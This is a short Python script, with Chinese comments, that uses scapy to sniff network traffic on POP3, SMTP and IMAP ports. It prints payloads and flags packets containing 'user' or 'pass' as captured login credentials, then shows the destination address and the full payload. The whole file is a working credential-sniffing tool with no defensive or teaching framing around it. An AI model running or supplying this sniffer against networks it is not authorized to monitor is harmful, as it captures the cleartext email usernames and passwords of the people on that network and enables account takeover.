from scapy.all import *

def packet_callback(packet):
    # 先显示所有捕获的数据包摘要
    print(f"捕获到数据包: {packet.summary()}")
    
    # 检查是否是目标端口的TCP包
    if packet.haslayer(TCP):
        tcp_layer = packet[TCP]
        print(f"TCP 端口: {tcp_layer.sport} -> {tcp_layer.dport}")
        
        # 检查是否是目标端口
        if tcp_layer.dport in [110, 25, 143] or tcp_layer.sport in [110, 25, 143]:
            print(f"*** 发现目标端口流量! ***")
            
            if tcp_layer.payload:
                try:
                    payload = bytes(tcp_layer.payload).decode('utf-8', errors='ignore')
                    print(f"负载内容: {payload[:100]}...")  # 显示前100个字符
                    
                    if 'user' in payload.lower() or 'pass' in payload.lower():
                        print(f"[!] 发现认证信息!")
                        print(f"目标地址: {packet[IP].dst}")
                        print(f"完整负载:\n{payload}")
                except Exception as e:
                    print(f"处理负载时出错: {e}")

def main():
    print("邮件嗅探器启动 - 监听端口 110(POP3), 25(SMTP), 143(IMAP)")
    print("等待目标流量...")
    
    # 使用与DNS嗅探相同的配置，只是过滤器不同
    sniff(iface="以太网", 
          prn=packet_callback, 
          filter="tcp port 110 or tcp port 25 or tcp port 143",
          timeout=60)  # 设置超时，避免无限等待

if __name__ == "__main__":
    main()